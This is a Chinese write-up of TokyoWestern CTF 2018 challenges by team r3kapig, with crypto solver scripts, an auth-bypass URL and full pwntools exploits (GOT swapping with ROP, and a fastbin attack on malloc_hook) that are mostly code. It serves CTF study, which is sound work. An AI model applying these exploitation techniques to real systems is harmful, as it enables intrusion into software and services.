> 原文链接: https://www.anquanke.com//post/id/158894 


# TokyoWestern CTF WriteUp by r3kapig


                                阅读量   
                                **196381**
                            
                        |
                        
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



[![](https://p5.ssl.qhimg.com/t018e490cf78b06e2e3.jpg)](https://p5.ssl.qhimg.com/t018e490cf78b06e2e3.jpg)

## 前言

这次比赛由于我们队部分队员在新加坡，所以我们本来是打算随便玩玩的。然后玩着玩着我们就打到第四名了。战队目前正在招募队员，欢迎想与我们一起玩的同学加入我们，尤其是熟悉密码学或浏览器利用的大佬。给大家递茶。<br>[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://ob2hrvcxg.bkt.clouddn.com/20180905013315.png)



## scs7 | Crypto

思路：不知道加密方式，但是可以确定，明文正确的话，对应的密文前面是正确的，因此逐位爆破，并设立一个评分机制，每次选最高的，如果碰到评分一样的，那么全部进入下一分支，找后续一位评分最高的。

```
from zio import *
target=("crypto.chal.ctf.westerns.tokyo",14791)
def cr(io,m):
    io.read_until("message: ")
    io.writeline(m)
    io.read_until(": ")
    c=io.read_until("n")[:-1]
    return c
def score(get_c,c):
    score=0
    for i in range(len(get_c)):
        if get_c[i]!=c[i]:
            return score
        else:
            score+=1
    return score
import string

def guess_(i,pre):

    io = zio(target, timeout=10000, print_read=COLORED(NONE, 'red'),
             print_write=COLORED(NONE, 'green'))
    io.read_until("encrypted flag: ")
    c = io.read_until("n")[:-1]
    max_score=0
    max_value=[]
    for g in string.printable:
        get_c=cr(io,pre+g+"a"*(47-len(pre+g)))
        tmp_score=score(get_c,c)
        #print g,tmp_score
        if tmp_score&gt;max_score:
            max_score=tmp_score
            max_value=[g]
        elif tmp_score==max_score:
            max_value.append(g)
    return max_value,max_score
import time
def guess(i,pre=""):
    print "guess work with pre-str:",pre
    while 1:
        try:
            return guess_(i,pre)
        except Exception,e:
            print e
            time.sleep(2)

pre="TWCTF`{`67ced"
last_already_calc=0
last_max_value=0
last_max_score=[]
for i in range(47):
    if last_already_calc==0:
        max_value,max_score=guess(i,pre)
    else:
        max_value, max_score=last_max_value,last_max_score
        last_already_calc=0
    if len(max_value)==1:
        pre=pre+max_value[0]
        print "succuess:",pre
        continue
    else:
        tmp_max_score=0
        tmp_max_value=[]
        tmp_chosen_value=0
        print "guess",max_value
        for multi_value in max_value:
            tmp_value,tmp_score=guess(i,pre+multi_value)
            if tmp_score&gt;tmp_max_score:
                tmp_max_score=tmp_score
                tmp_max_value=tmp_value
                tmp_chosen_value=multi_value
        pre=pre+tmp_chosen_value
        print "succuess:", pre
        last_max_score=tmp_max_score
        last_max_value=tmp_max_value
        last_already_calc=1
    print pre
```



## rsa | Crypto

```
n=0x8529063EA0AD3B46296F92F72356772EA4E703F7B79220C18DE1B7E3CA0A7728D19E69DC48B8685CD604F5887A4F8F3A945A1CA1593CF086D348EC4DC92142083FC9E2203C6530311EE510BE50A42AEE4A63E7FA66BFCE3512FC2FB117402A55CDF0897770C1BB86F2D9306DA5B899D294EDBCB17AD87E17592CCC3F62B1305724181732AC7474CF23BEB722833373EF07B6A92188CF28BCFEF26B2368ADA38F7F4FD8921DBE3B6488E4B92028FFBD46AE26D8B43C9A86DBBC63F0B51398BB54098FF7004B646AFB42F24354AB6A2D30EFEEE8B333473ABE1CC92EB68A465819D9E9A0FF58FEAF2C722AE65B7CEDC9E30BE915029D69342523B981AD8395CDF7
e=0x10001
```

数论题，推理如下<br>
eq = 1 mod p

有：<br>
p | eq-1<br>
同时乘q，即：<br>
n | (eq-1)q

所以：

```
eq^2-q－kn=0
```

delta=1-4**e**(-kn)=1+4ken<br>
q=（1+sqrt(delta)）/（2e）

思路：转化到上式后，利用求根公式，delta需要为完全平方数，爆破k，直到得到一个完全平方数为止，测试是否为q，分解n，解密c

最终得到：<br>
delta=15437412055699760033228916416773388687758495883388405427219519968006361800232351092586513254042697417365303248564432783709932135844205171385876634738995524060511238569866876444551767422579436935801803651623293057191182325987659215635528040854348013316932722970176956521681782203617683425665727504728779196852929921<br>
q=117776309990537864360810812340917258096636219871129327152749744175094693075913995854147376703562090249517854407162616412941789644355136574651545193852293544566513866746012759544621873312628262933928953504305148673201262843795559879423287920215664535429854303448257904097546288383796049755601625835244054479553

脚本1: 爆破delta

```
n=0x8529063EA0AD3B46296F92F72356772EA4E703F7B79220C18DE1B7E3CA0A7728D19E69DC48B8685CD604F5887A4F8F3A945A1CA1593CF086D348EC4DC92142083FC9E2203C6530311EE510BE50A42AEE4A63E7FA66BFCE3512FC2FB117402A55CDF0897770C1BB86F2D9306DA5B899D294EDBCB17AD87E17592CCC3F62B1305724181732AC7474CF23BEB722833373EF07B6A92188CF28BCFEF26B2368ADA38F7F4FD8921DBE3B6488E4B92028FFBD46AE26D8B43C9A86DBBC63F0B51398BB54098FF7004B646AFB42F24354AB6A2D30EFEEE8B333473ABE1CC92EB68A465819D9E9A0FF58FEAF2C722AE65B7CEDC9E30BE915029D69342523B981AD8395CDF7
e=0x10001
import primefac
import gmpy2

k=0


while 1:
    k+=1
    delta=1+4*k*e*n
    if gmpy2.iroot(delta,2)[1]==True:
        print k
        print gmpy2.iroot(delta,2)
        gmpy2.iroot(delta,2)[0]
```

脚本2：计算flag

```
n=0x8529063EA0AD3B46296F92F72356772EA4E703F7B79220C18DE1B7E3CA0A7728D19E69DC48B8685CD604F5887A4F8F3A945A1CA1593CF086D348EC4DC92142083FC9E2203C6530311EE510BE50A42AEE4A63E7FA66BFCE3512FC2FB117402A55CDF0897770C1BB86F2D9306DA5B899D294EDBCB17AD87E17592CCC3F62B1305724181732AC7474CF23BEB722833373EF07B6A92188CF28BCFEF26B2368ADA38F7F4FD8921DBE3B6488E4B92028FFBD46AE26D8B43C9A86DBBC63F0B51398BB54098FF7004B646AFB42F24354AB6A2D30EFEEE8B333473ABE1CC92EB68A465819D9E9A0FF58FEAF2C722AE65B7CEDC9E30BE915029D69342523B981AD8395CDF7
e=0x10001
sqt_delta=15437412055699760033228916416773388687758495883388405427219519968006361800232351092586513254042697417365303248564432783709932135844205171385876634738995524060511238569866876444551767422579436935801803651623293057191182325987659215635528040854348013316932722970176956521681782203617683425665727504728779196852929921
q=(1+sqt_delta)/(2*e)
import primefac
print primefac.isprime(q)
print q

p=n/q
d=primefac.modinv(e,(p-1)*(q-1))%((p-1)*(q-1))


c=int(open("flag.encrypted","rb").read().encode("hex"),16)
m=pow(c,d,n)
print ("0"+hex(m)[2:-1]).decode("hex")
```



## mixed cipher | Crypto

rsa：n 1024bit 未知, e 65537<br>
aes：key 16字节随机，pkcs padding，密文前16字节是iv

```
bulldozer
```

给除了最后一位外的所有位打马赛克

功能：

```
encrypt
```

输入明文，输出rsa加密和aes加密后的密文

```
decrypt
```

输入密文，输出rsa解密的明文的最后一位

```
print_flag
```

输出aes对flag加密后密文，隐藏了iv

```
print_key
```

输出rsa对aes的key的加密

每次连接，公钥和aeskey是唯一的<br>
每次aes的iv都是不一样的

本题目分为三部解决：（俄罗斯套娃）

1 算n<br>
因为可以随意加解密，所以利用整除性质可以算n<br>
x^e =c mod n<br>
所以 n | x^e -c<br>
构造足够多的x，然后可以知道些许右边，求最大公约数，即可得到n

2 RSA parity oracle

[https://ctf-wiki.github.io/ctf-wiki/crypto/asymmetric/rsa/rsa_chosen_cipher/](https://ctf-wiki.github.io/ctf-wiki/crypto/asymmetric/rsa/rsa_chosen_cipher/)

rsa的选择密文攻击，通过选择密文攻击可以得到被rsa加密的aes的key

3 伪随机数攻击<br>[https://ddaa.tw/30c3ctf_2013_number_100_guess.html](https://ddaa.tw/30c3ctf_2013_number_100_guess.html)<br>
知道key了后，利用生成iv时的伪随机数函数，收集足够多的密钥量后，可以预测iv

整体代码如下：<br>
主题代码部分：

```
from zio import *
import primefac
from Crypto.Util.number import long_to_bytes,bytes_to_long
target=("crypto.chal.ctf.westerns.tokyo",5643)
e=65537

def get_enc_key(io):
    io.read_until("4: get encrypted keyn")
    io.writeline("4")
    io.read_until("here is encrypted key :)n")
    c=int(io.readline()[:-1],16)
    return c

def encrypt_io(io,p):
    io.read_until("4: get encrypted keyn")
    io.writeline("1")
    io.read_until("input plain text: ")
    io.writeline(p)
    io.read_until("RSA: ")
    rsa_c=int(io.readline()[:-1],16)
    io.read_until("AES: ")
    aes_c=io.readline()[:-1].decode("hex")
    return rsa_c,aes_c

def decrypt_io(io,c):
    io.read_until("4: get encrypted keyn")
    io.writeline("2")
    io.read_until("input hexencoded cipher text: ")
    io.writeline(long_to_bytes(c).encode("hex"))
    io.read_until("RSA: ")
    return io.read_line()[:-1].decode("hex")

def get_n(io):
    rsa_c,aes_c=encrypt_io(io,long_to_bytes(2))
    n=pow(2,65537)-rsa_c
    for i in range(3,6):
        rsa_c, aes_c = encrypt_io(io, long_to_bytes(i))
        n=primefac.gcd(n,pow(i,65537)-rsa_c)
    return n

def check_n(io,n):
    rsa_c, aes_c = encrypt_io(io, "123")
    if pow(bytes_to_long("123"), e, n)==rsa_c:
        return True
    else:
        return False


import gmpy2
def guess_m(io,n,c):
    k=1
    lb=0
    ub=n
    while ub!=lb:
        print lb,ub
        tmp = c * gmpy2.powmod(2, k*e, n) % n
        if ord(decrypt_io(io,tmp)[-1])%2==1:
            lb = (lb + ub) / 2
        else:
            ub = (lb + ub) / 2
        k+=1
    print ub,len(long_to_bytes(ub))
    return ub


io = zio(target, timeout=10000, print_read=COLORED(NONE, 'red'),print_write=COLORED(NONE, 'green'))
n=get_n(io)
print check_n(io,n)
c=get_enc_key(io)
print len(decrypt_io(io,c))==16


m=guess_m(io,n,c)
for i in range(m - 50000,m+50000):
    if pow(i,e,n)==c:
        aeskey=i
        print long_to_bytes(aeskey)[-1]==decrypt_io(io,c)[-1]
        print "found aes key",hex(aeskey)

import fuck_r
next_iv=fuck_r.get_state(io)
print "##########################################"
print next_iv
print aeskey
io.interact()
```

算随机数的python lib和java lib

```
from Crypto.Util.number import long_to_bytes,bytes_to_long



def encrypt_io(io,p):
    io.read_until("4: get encrypted keyn")
    io.writeline("1")
    io.read_until("input plain text: ")
    io.writeline(p)
    io.read_until("RSA: ")
    rsa_c=int(io.readline()[:-1],16)
    io.read_until("AES: ")
    aes_c=io.readline()[:-1].decode("hex")
    return rsa_c,aes_c
import subprocess
import random
def get_iv(io):
    rsa_c, aes_c=encrypt_io(io,"1")
    return bytes_to_long(aes_c[0:16])
def splitInto32(w128):
    w1 = w128 &amp; (2**32-1)
    w2 = (w128 &gt;&gt; 32) &amp; (2**32-1)
    w3 = (w128 &gt;&gt; 64) &amp; (2**32-1)
    w4 = (w128 &gt;&gt; 96)
    return w1,w2,w3,w4
def sign(iv):
    # converts a 32 bit uint to a 32 bit signed int
    if(iv&amp;0x80000000):
        iv = -0x100000000 + iv
    return iv
def get_state(io):
    numbers=[]
    for i in range(156):
        print i
        numbers.append(get_iv(io))
    observedNums = [sign(w) for n in numbers for w in splitInto32(n)]
    o = subprocess.check_output(["java", "Main"] + map(str, observedNums))
    stateList = [int(s) % (2 ** 32) for s in o.split()]
    r = random.Random()
    state = (3, tuple(stateList + [624]), None)
    r.setstate(state)
    return r.getrandbits(128)

'''
target=("crypto.chal.ctf.westerns.tokyo",5643)
io = zio(target, timeout=10000, print_read=COLORED(NONE, 'red'),print_write=COLORED(NONE, 'green'))
print get_state(io)
print get_iv(io)
io.interact()'''
```

```
public class Main `{`

   static int[] state;
   static int currentIndex;

   public static void main(String[] args) `{`
      state = new int[624];
      currentIndex = 0;

//    initialize(0);

//    for (int i = 0; i &lt; 5; i++) `{`
//       System.out.println(state[i]);
//    `}`

      // for (int i = 0; i &lt; 5; i++) `{`
      // System.out.println(nextNumber());
      // `}`

      if (args.length != 624) `{`
         System.err.println("must be 624 args");
         System.exit(1);
      `}`
      int[] arr = new int[624];
      for (int i = 0; i &lt; args.length; i++) `{`
         arr[i] = Integer.parseInt(args[i]);
      `}`

//    int[] arr = new int[] `{`-668203059, 1654615998, -1039577940, -471398782, 1806341205, 173879092, 1112038970, -148327174, -2099059102, 2087043557, 1739178872, -351180877, -928577991, -730776224, 1302718217, -138297977, 2046968324, 1537810351, -1789360513, -465313928, -394652141, 938204377, -2127353738, 598176026, 1210484339, 600203567, -1048812935, 407295012, -1639092676, -861559391, 1075916535, -54721341, -387636886, -2007623918, -73935819, -1266275551, -815110754, -1709817594, -420194037, 631194409, 1332073689, 424185324, -1160363781, 316721330, -434486244, -642210028, -1357278678, 1418186270, 2027837527, -1890585826, 432508404, 1519522183, 1864753826, 1358054485, -1671227719, -1544369729, -373614660, 878225224, -143424575, -1921896188, 2048741382, 1901353491, -578489442, -2055770470, 1118805955, 267488770, -837399110, -350190618, -1938321754, -360800951, 60308648, 400599612, -1203859220, -686802991, 1712934065, -1244452074, -752285108, -923212848, -1425271167, -1609471003, 4908357, -1666889315, 2119900799, -738462598, -568641750, 1430804514, 1047589226, -1158444678, 1396742090, -1272845589, -556321816, 270515404, 820626892, -356400817, -1857527217, 952210990, 1024847607, -844626580, -139413550, 612008755, -845337731, -1962843199, 1924014660, 391769539, 345512145, -29113186, 1374624034, -536496032, -2113378858, -8711794, -288476533, 2101470722, 468399889, 1294704107, -1927292489, 1250224899, -1260309123, 536057929, -1943726486, 1429152570, -796858770, -333934853, -1974466879, 872745308, -155312270, -861454009, -1704304750, -1944631897, -1771171209, 1235478542, 1911213317, 393556845, -1733934739, -867862495, 1653137829, 1361705852, -1822565006, 1039842312, 1246955724, 789710164, 813429542, -766792476, 801997237, 141615452, -1663126554, -80317000, -1474636681, 1116932915, 2046685052, 296718909, 385792672, -1379870086, -1041083208, 559309739, -529267221, 642313784, -329076024, 165964262, -676628184, 344663896, -437343114, -1291398744, -330358405, -732889526, -1973108295, -1359364085, 1680603714, -696363523, -1265798159, -2041939376, 1183839549, -2053895897, -809048539, 1011472239, -646452845, 924282500, -450804218, -1376647162, -1761790512, -750488432, -215758220, 1801409089, -1805196174, 1182021441, 1935153793, 2115938757, -1459234992, -1541047910, -16072463, -1287521587, -356734768, -75332083, -887661990, 1534881946, 353789296, 1392964597, -1663083898, 495423391, 2089261940, -1773500660, -1588505081, 1439975734, -665386750, 817670926, 1043830061, 69617246, -1153245006, 1164099199, 503087954, -1265584632, 946870804, 1597986360, -882259400, 732213632, 1428231901, 1830219288, -790647229, 267114565, 432105997, -931498909, 628604922, -621384609, -1298494714, 939625287, 194278833, -785462332, -1830231447, -1571071491, -386478286, -272645730, -2000604499, -1708664744, -1371859220, 317814271, 114661864, 534481714, -1567663440, 809689893, -1690763648, -729774497, -1821268193, 514088150, 1680231637, 393126321, 1589738942, -713632747, -83680351, 498414388, 156302611, -1694346684, 92928119, 835761764, -167369407, -125877251, 794448426, -1210694021, 532125690, 2058292873, 904419226, -1171859375, -855786853, 262357606, -270715400, -1377193292, 97850419, -1957493987, 1828018965, -1629510694, 435940125, -704792726, 1116347426, 300666185, 948454521, 309116047, -1516442472, 1293049471, 1504501144, 1872900585, 774459493, 262175295, -2131864978, 2006313350, 169130250, -1733084050, 433453424, -1291397376, -50529663, 1680518472, 856226606, 1117263813, 1539983294, -410604745, -1152776501, 2019563010, -694382142, -419600152, -350116874, -1847830033, 727673138, -1298381187, -1405998062, 873659410, -143671368, -999231257, 249326891, -907748686, -1390702752, 679500893, -663896303, 695587449, 1470221169, -2020892821, 1076693935, 503425332, -1731767803, -337505432, 1899724293, -1436212053, 750843993, 56709708, 2025615733, -1368889078, 1760530271, -429075602, -1850646691, -537709749, -2110546397, -354287010, 1337650368, -1507819197, 1533954791, 1669205724, -697239960, -1470527220, 1077747587, 658902818, -1887207689, -1327906134, 53413578, 1966898329, -1109929573, 339619332, 1442750606, -1120917222, 196264944, -1957132854, 1206384019, 579123108, 1031352225, -1021486441, -201307945, 2069431579, 1512797275, -1674454606, 1236426221, -1402721460, 1542757380, -1759743955, -228037718, -464098948, -1573040995, -628034252, -1627462556, 568414356, -1221405585, 1332717957, 1666521335, -1080244923, 1779911708, -734856997, -1499661435, 346703132, 6546479, -1741278839, 825963191, -1294577489, 1436244341, 687537412, 1028283729, 958197830, -1557357713, 1924726585, 1626281073, -1244037385, -535052464, -1401124861, -1854775542, -538856697, 1779861933, 135486808, 1727723913, -551095017, -1280632020, -1857692155, 1796269370, -978454911, -1450857631, -1249809548, 200917231, 711568583, 1912773091, 274389611, 1113371136, -1281978281, 677258676, 1917121846, -2029057972, -494155265, 2092789797, -394965805, -1883751509, -1700904176, -1050184897, 297036, -498752416, 167117967, 2124216399, 1399918423, 1340279962, -696914953, 2005286885, 214134156, -820141808, -761412129, -536800795, -110909457, -805671715, 1783001626, 807459420, -1938911177, -2489546, -158751579, -1575871803, -92033628, 358488241, -698153827, -1178735059, 560586626, -56601290, 63261809, 1725790100, -216691700, -1380767541, 1793084754, 1357970475, 14572021, 917081460, 61380729, -1214083574, -1053324315, 10125659, -84848613, -761362797, -1392592053, -2025738607, -1666181183, 419980565, 818019178, 510688338, -1682082547, -1506393508, 852621339, -542652691, 1298867023, 1202516726, -1337710518, -92276545, 782633881, 430272795, 2042709959, -627331049, -331701484, 1703797118, -1599277879, 349375932, 93825718, 1179886944, -369877824, 1945526488, -859746991, -891886316, 497268706, -595454681, 1101610896, 573036909, -1487918463, -2057866902, -784805552, -1499874592, -1524968205, 1490581366, 494390848, -550340611, 663315337, 1195761054, -638920410, 79776130, 181666837, 174647438, 883628285, -1370108417, 1115271501, -1896847660, 1351683036, -229769768, 1575796842, -264403350, -1857711698, -387186253, -646659770, 180408077, -659879120, -1077457751, -166632242, -1282800133, -1685360223, -1480209529, 2123799795, -1235414490, -1528392247, -417856734, 1969948437, -1545581765, 1870203225, 1599657397, -552286702, -1984580760, 765742497, 892683641, 1613099182, -1773282441, 1249987923, 38212703, 594668076, 648639589, 1165540019, 1431978117, 1449598999, -903561651, 1577118317, -1209035748, 402470710, 1452798332, -947397125, -1629776398, 153182031, 176965319, 1158018294, 703775687, 641736990, -77678490, -1789063561, 1243525559, 1550082102, 1695618646, -45943145, -1939245169, 556803596, 1260173501, 493476348, 2053272110, -1157400341, 1029529788, -284524051, 207259503, 1322333523, 771319623, -614023206, -2048483671, -1165393187, 304353766, 1299960583, 1731598297, -706265537, 1410985724, 1285163745, 1781215744, 466654280, 426921187, -1886220859, -392312811, 2066619266, 2035834473, 1447749897, -683551223, -868123012, -102093724, -806042261, 1475972382, 533970967, 2057660952, 498250834, -1290228404, 2137753491, 1831955274, 162454480, 1296664028, 1439165853, -1139235829, -1343850230, -453549474, 668572195, -344933787, 715353335, -1603130720, -1870512422, 1613066649, -832714745, -109261737, -36508294, -1551004932, 373326185, 282757781, -825610525, 363653025, 850576530, -1074302002, 949439989, 262663685, 1652754537, 33719836, 421235423, 1691392275, -1904927049`}`;

      rev(arr);

      for (int i = 0; i &lt; 624; i++) `{`
         System.out.println(state[i]);
      `}`

//    System.out.println("currentIndex " + currentIndex);
//    System.out.println("state[currentIndex] " + state[currentIndex]);
//    System.out.println("next " + nextNumber());

      // want -2065863258
   `}`

   static void nextState() `{`
      // Iterate through the state
      for (int i = 0; i &lt; 624; i++) `{`
         // y is the first bit of the current number,
         // and the last 31 bits of the next number
         int y = (state[i] &amp; 0x80000000)
               + (state[(i + 1) % 624] &amp; 0x7fffffff);
         // first bitshift y by 1 to the right
         int next = y &gt;&gt;&gt; 1;
         // xor it with the 397th next number
         next ^= state[(i + 397) % 624];
         // if y is odd, xor with magic number
         if ((y &amp; 1L) == 1L) `{`
            next ^= 0x9908b0df;
         `}`
         // now we have the result
         state[i] = next;
      `}`
   `}`

   static int nextNumber() `{`
      currentIndex++;
      int tmp = state[currentIndex];
      tmp ^= (tmp &gt;&gt;&gt; 11);
      tmp ^= (tmp &lt;&lt; 7) &amp; 0x9d2c5680;
      tmp ^= (tmp &lt;&lt; 15) &amp; 0xefc60000;
      tmp ^= (tmp &gt;&gt;&gt; 18);
      return tmp;
   `}`

   static void initialize(int seed) `{`

      // http://code.activestate.com/recipes/578056-mersenne-twister/

      // global MT
      // global bitmask_1
      // MT[0] = seed
      // for i in xrange(1,624):
      // MT[i] = ((1812433253 * MT[i-1]) ^ ((MT[i-1] &gt;&gt; 30) + i)) &amp; bitmask_1

      // copied Python 2.7's impl (probably uint problems)
      state[0] = seed;
      for (int i = 1; i &lt; 624; i++) `{`
         state[i] = ((1812433253 * state[i - 1]) ^ ((state[i - 1] &gt;&gt; 30) + i)) &amp; 0xffffffff;
      `}`
   `}`

   static int unBitshiftRightXor(int value, int shift) `{`
      // we part of the value we are up to (with a width of shift bits)
      int i = 0;
      // we accumulate the result here
      int result = 0;
      // iterate until we've done the full 32 bits
      while (i * shift &lt; 32) `{`
         // create a mask for this part
         int partMask = (-1 &lt;&lt; (32 - shift)) &gt;&gt;&gt; (shift * i);
         // obtain the part
         int part = value &amp; partMask;
         // unapply the xor from the next part of the integer
         value ^= part &gt;&gt;&gt; shift;
         // add the part to the result
         result |= part;
         i++;
      `}`
      return result;
   `}`

   static int unBitshiftLeftXor(int value, int shift, int mask) `{`
      // we part of the value we are up to (with a width of shift bits)
      int i = 0;
      // we accumulate the result here
      int result = 0;
      // iterate until we've done the full 32 bits
      while (i * shift &lt; 32) `{`
         // create a mask for this part
         int partMask = (-1 &gt;&gt;&gt; (32 - shift)) &lt;&lt; (shift * i);
         // obtain the part
         int part = value &amp; partMask;
         // unapply the xor from the next part of the integer
         value ^= (part &lt;&lt; shift) &amp; mask;
         // add the part to the result
         result |= part;
         i++;
      `}`
      return result;
   `}`

   static void rev(int[] nums) `{`
      for (int i = 0; i &lt; 624; i++) `{`

         int value = nums[i];
         value = unBitshiftRightXor(value, 18);
         value = unBitshiftLeftXor(value, 15, 0xefc60000);
         value = unBitshiftLeftXor(value, 7, 0x9d2c5680);
         value = unBitshiftRightXor(value, 11);

         state[i] = value;
      `}`
   `}`
`}`
```

计算最终结果：

```
from Crypto.Util.number import long_to_bytes
c="232323232323232323232323232323236ac90897e6138c3ffde3666669fdca767a03e4b5e44f309fa322df4d4a27dbaae7a5b335be00e82a4150a18fb461adfd39e4c7e9bb00ba6edb59a1f37dda3f28".decode("hex")
iv=long_to_bytes(83345920849977169166026104781978405220)

key=long_to_bytes(102748041203696210196740355202977186893)
from Crypto.Cipher import AES
aes = AES.new(key, AES.MODE_CBC,iv)

print aes.decrypt(c[16:])
```

心得：本题还是学了不少，但是此类俄罗斯套娃题花费精力太多，实在是无语



## Simple auth | web

parse_url解析造成的未初始化变量赋值漏洞，通过parse_url直接解析出hashed_password变量。<br>[http://simpleauth.chal.ctf.westerns.tokyo/?action=auth&amp;hashed_password=c019f6e5cd8aa0bbbcc6e994a54c757e](http://simpleauth.chal.ctf.westerns.tokyo/?action=auth&amp;hashed_password=c019f6e5cd8aa0bbbcc6e994a54c757e)



## tw playing card | reverse

整个binary是一个nimlang写的扑克游戏，主逻从NimMainModule_402010开始

sub_401AA0是游戏的逻辑，lucky_enough_4017B0这个函数会检查你手里的牌是不是他要的

```
v23 = lucky_enough_4017B0(player_cards);
  v24 = print_40BDA0((signed __int64 *)&amp;ending_410CA0);
  ending = v24;
  if ( v23 )
  `{`
    v28 = sub_410960(ciphernimstr_6152C8, player_cards_packages_6152C0);
    ending = sub_40E170(ending, *v28);
    memcpy((char *)ending + *ending + 16, v28 + 2, *v28 + 1);
    *ending += *v28;
LABEL_20:
    v26 = (const char *)(ending + 2);
  `}`
  else
  `{`
    if ( v24 )
      goto LABEL_20;
    v26 = (const char *)&amp;unk_410C84;
  `}`
```

如果你手里的牌是他要的，ending这个最终输出会和sub_410960这里的加密结果合并（字符串加），并打印出来，后面的分析基于我们在程序运行过程中patch了手牌

sub_410960会调用tea_like_410800进行xxtea加密，通过调试发现，这个函数的两个参数，不随着我们开头输入的name而改变（应该就是sub_410960的两个参数，当时太困了，没有考证），即输入输出全部来自程序本身，值得注意的是0x6152c8这个nim数组来自于另一个常量异或加密0x20（NimMainModule_402010、ciphermaybe_4113A0），这样的话我们将这段内存patch成它的异或0x20结果

手牌和初始密文都被patch后，直接运行binary，程序会在游戏结束时为我们输出解密了的flag



## Swap Return | Pwn
1. 把printf和atoi交换以后可以leak出stack的地址，
1. 通过partialoverwrite来覆盖setvbuf来得到gets的地址。
1. 把stack_check_failed改成ret
1. 把atoi换成gets
1. ROP
```
from pwn import *

local=1
pc='/tmp/pwn/swap_returns_debug'
remote_addr="swap.chal.ctf.westerns.tokyo"
remote_port=37567
aslr=False

libc=ELF('./libc.so.6')
#libc=ELF('/lib/x86_64-linux-gnu/libc-2.23.so')
#libc=ELF('/lib/i386-linux-gnu/libc-2.23.so')
#context.log_level=True

if local==1:
    p = process(pc,aslr=aslr,env=`{`'LD_PRELOAD': './libc.so.6'`}`)
    gdb.attach(p,'c')
else:
    p=remote(remote_addr,remote_port)

ru = lambda x : p.recvuntil(x)
sn = lambda x : p.send(x)
rl = lambda   : p.recvline()
sl = lambda x : p.sendline(x) 
rv = lambda x : p.recv(x)
sa = lambda a,b : p.sendafter(a,b)
sla = lambda a,b : p.sendlineafter(a,b)

def lg(s,addr):
    print('33[1;31;40m%20s--&gt;0x%x33[0m'%(s,addr))

def raddr(a=6):
    if(a==0):
        return u64(rv(a).ljust(8,'x00'))
    else:
        return u64(rl().strip('n').ljust(8,'x00'))

def set_addr(addr1,addr2):
    sla("choice:",'1')
    sla("address:",str(addr1))
    sla("address:",str(addr2))

def sw():
    sla("choice:",'2')

fuck=0x601500
save=0x601700
zero=0x601800

def make_byte(bt):
    global fuck
    global save
    global zero
    i=0
    for k in range(len(bt)):
        byte=u8(bt[i])
        set_addr(fuck+byte,stack_addr)
        sw()
        set_addr(fuck+byte+1,zero)
        sw() 
        set_addr(fuck+byte,save+i)
        sw() 
        i+=1
        zero+=8

if __name__ == '__main__':
    sla("choice:",'9')
    rl()
    atoi=0x601050
    printf=0x0601038
    stack_check_failed=0x601030
    setvbuf=0x601048
    bss=0x601100
    set_addr(atoi,printf)
    sw()
    sa("choice:",'%x')
    rv(8)
    stack_addr=int('7fff'+rv(8),16)-6+0x30
    lg('stack_addr',stack_addr)
    sa("choice:",'ax00')
    sla("address:",str(atoi))
    sla("address:",str(printf))
    sa("choice:",'aa')
    set_addr(bss,setvbuf)
    sw()
    set_addr(bss+0x100,stack_check_failed)
    sw()
    make_byte(p16(0x6ff0))
    set_addr(bss-6,save-6)
    sw()
    make_byte(p16(0x8e8))
    set_addr(bss+0x100-6,save-6)
    sw()
    set_addr(bss+0x100,stack_check_failed)
    sw()
    puts_plt=0x4006A0
    poprdiret=0x0400a53
    puts_got=0x601028
    poprbpret=0x0000000000400760
    leaveret=0x4008E7
    payload='A'*22+p64(poprbpret)+p64(save-8)+p64(leaveret)
    payload2=p64(poprdiret)+p64(puts_got)+p64(puts_plt)+p64(0x40088E)
    make_byte(payload2)
    set_addr(bss,atoi)
    sw()
    sla("choice:",payload)
    ru(": n")
    puts_addr=raddr(6)
    lg("puts addr",puts_addr)
    libc.address=puts_addr-libc.symbols['puts']
    one_shot=libc.address+0x4557a
    sl(cyclic(20)+p64(one_shot))

    p.interactive()
```



## BBQ| Pwn

逻辑很简单，主要是在eat函数有一个ptr未初始化的bug<br>
所以利用步骤是
1. 利用ptr未初始化leak出堆地址。然后结合buy的输入，可以做到任意地址free
1. 伪造一个fake的non-fastbin chunk，free，leak出libc的地址
1. 在malloc_hook附件伪造一个0x21的size
1. 在main_arean那里伪造一个Food struct，使得food的amount对于fastbin[0]的fd，这样我们就可以通过修改amount来让fastbin的fd指向malloc_hook伪造0x21处
1. fastbin attack来修改malloc_hook，再用one gadget
英文版的wp可以访问[https://changochen.github.io/2018/09/01/Tokyo-Western_CTF-2018/](https://changochen.github.io/2018/09/01/Tokyo-Western_CTF-2018/)

```
from pwn import *

local=0
pc='/tmp/pwn/BBQ_debug'
remote_addr="pwn1.chal.ctf.westerns.tokyo"
remote_port=21638
aslr=True

libc=ELF('./libc.so.6')
#libc=ELF('/lib/x86_64-linux-gnu/libc-2.23.so')
#libc=ELF('/lib/i386-linux-gnu/libc-2.23.so')
context.log_level=True
if local==1:
    #p = process(pc,aslr=aslr)
    p = process(pc,aslr=aslr,env=`{`'LD_PRELOAD': './libc.so.6'`}`)
    gdb.attach(p,'c')
else:
    p=remote(remote_addr,remote_port)

ru = lambda x : p.recvuntil(x)
sn = lambda x : p.send(x)
rl = lambda   : p.recvline()
sl = lambda x : p.sendline(x) 
rv = lambda x : p.recv(x)
sa = lambda a,b : p.sendafter(a,b)
sla = lambda a,b : p.sendlineafter(a,b)

def lg(s,addr):
    print('33[1;31;40m%20s--&gt;0x%x33[0m'%(s,addr))

def raddr(a=6):
    if(a!=0):
        return u64(rv(a).ljust(8,'x00'))
    else:
        return u64(rl().strip('n').ljust(8,'x00'))

def choice(idx):
    sla("Choice: ",str(idx))

def buy(name,amount):
    choice(1)
    sla("&gt;&gt; ",name)
    sla("&gt;&gt; ",str(amount))

def grill(name,idx):
    choice(2)
    sla("&gt;&gt; ",name)
    sla("&gt;&gt; ",str(idx))

def eat(idx):
    choice(3)
    sla("&gt;&gt; ",str(idx))

if __name__ == '__main__':
    name='x'*0x10+p64(0xDEADBEEF11)[:5]
